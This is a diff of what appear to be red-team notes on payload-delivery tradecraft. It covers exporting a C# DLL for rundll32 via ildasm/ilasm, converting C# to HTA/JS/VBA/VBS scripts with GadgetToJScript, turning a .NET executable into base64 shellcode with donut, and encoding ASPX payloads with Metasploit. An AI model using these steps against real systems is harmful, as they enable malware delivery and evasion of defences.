@@ -5,27 +5,27 @@
   * Rundll32 will require DLL_PROCESS_ATTACH to return
   * Rundll32 will auto exit if entry point function exit 
 
-```
+``` batch
 ildasm.exe /out:TestUnmanaged.il CSharpDll.dll
 ilasm.exe TestUnmanaged.il /DLL /output=TestUnamanged.dll /x64
 ```
 
 
 * launch c# dll from c++ dll
-```
+``` C++
 HMODULE managedDLL = LoadLibraryA(targetedDll);
 TestMethod managedMethod = (TestMethod)GetProcAddress(managedDLL, "MainFunc");
 managedMethod();
 ```
 
 * single cs file or c# dll to hta/js/vba/vbs
-```
+``` batch
 GadgetToJScript.exe -c test.cs -w [hta/js/vba/vbs]
 GadgetToJScript.exe -a test.dll -w [hta/js/vba/vbs]
 ```
 * GadgetToJScript requirement
   * entry point class is the first one in cs file
-    ```
+    ``` C#
     public class MainClass{
         public MainClass(){
             //code here
@@ -35,15 +35,15 @@ GadgetToJScript.exe -a test.dll -w [hta/js/vba/vbs]
   *  
 
 * Net exe to shellcode
-  * ```
+    ``` powershell
     donut.exe test.exe
     $filename = "C:\tools\donut\loader.bin"
     [system.Convert]::toBase64string([IO.File]::ReadAllBytes($filename)) | Clip
     ```
 
-* Check if aspx
-  * ```
+* Check if aspx 
+  ``` aspnet
     <%@ Page Language="C#" %><script runat="server"></script>
-    ```
+  ```
 
 * can use msf + encoder for aspx payload (on Windows 10 workstation). 
